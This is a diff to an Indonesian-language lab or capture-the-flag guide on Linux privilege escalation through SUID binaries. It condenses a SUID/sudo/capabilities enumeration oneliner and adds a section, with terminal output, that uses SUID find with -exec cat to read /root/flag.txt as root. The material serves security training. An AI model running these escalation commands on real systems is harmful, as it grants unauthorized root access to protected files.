@@ -66,17 +66,7 @@ www-data@jobportal:~$ find / -perm -4000 -type f 2>/dev/null
 
 > **Catatan:** Daftar di atas difokuskan hanya ke binary yang **langsung memberi shell**. Binary lain seperti `cp`, `tee`, `tar`, `zip`, `wget`, `curl`, `docker`, `nmap` tetap bisa diabuse (menimpa/membaca file sistem) — daftar lengkapnya di GTFOBins → bagian **SUID**. Cukup **satu** entry RENTAN untuk mendapatkan root shell.
 
-Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:
-
-```bash
-find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
-```
-
-- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID (vektor file ini)
-- `sudo -l` → enumerasi permission sudoers → [Sudo.md](Sudo.md)
-- `getcap -r / 2>/dev/null` → enumerasi capabilities → [Capabilities.md](Capabilities.md)
-
-> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Oneliner inilah yang dipakai pada PoC laporan (langkah eskalasi root) karena satu command langsung menyingkap ketiga vektor LPE sekaligus.
+> **Oneliner gabungan:** `find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null` — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command (dipakai pada PoC laporan, langkah eskalasi root). Breakdown, tampilan output rentan, dan langkah lanjut → [LPE_Oneliner.md](LPE_Oneliner.md)
 
 ---
 
@@ -192,6 +182,29 @@ Payload yang menggunakan `system()` → `/bin/sh` (dash) dapat **menurunkan priv
 
 ---
 
+## Mencari & Membaca Flag via SUID find
+
+`find` bisa dipakai **tanpa spawn shell sama sekali** — `-exec` menjalankan `cat` sebagai child process yang mewarisi `euid=0` dari SUID find, jadi tidak kena masalah privilege drop dash:
+
+```bash
+# find — cari lokasi flag di seluruh filesystem
+/usr/bin/find / -iname flag.txt
+
+# find — baca flag langsung tanpa shell (cat mewarisi euid=0)
+/usr/bin/find /root/flag.txt -exec cat {} +
+```
+
+```text
+www-data@jobportal:~$ /usr/bin/find / -iname flag.txt
+/root/flag.txt
+www-data@jobportal:~$ /usr/bin/find /root/flag.txt -exec cat {} +
+FLAG{suid_binary_leads_to_root}
+```
+
+> **Capture:** Flag terbaca **tanpa shell** — `-exec cat {} +` menjalankan `cat` sebagai child SUID find sehingga mewarisi `euid=0(root)` dan berhasil membaca `/root/flag.txt`, sekaligus menghindari privilege drop pada shell seperti dash.
+
+---
+
 ## Alur Eksploitasi
 
 ```text
@@ -226,6 +239,7 @@ Verifikasi privilege dengan id
 - [ ] Pilih teknik yang tepat (`-p`, `exec`, `system`, dll.).
 - [ ] Uji payload dan pastikan euid tetap 0.
 - [ ] Verifikasi dengan `id` → `uid=0(root) euid=0(root)`.
+- [ ] Cari lokasi flag (`/usr/bin/find / -iname flag.txt`) lalu baca langsung via `-exec cat {} +` (tanpa shell).
 
 ---
 
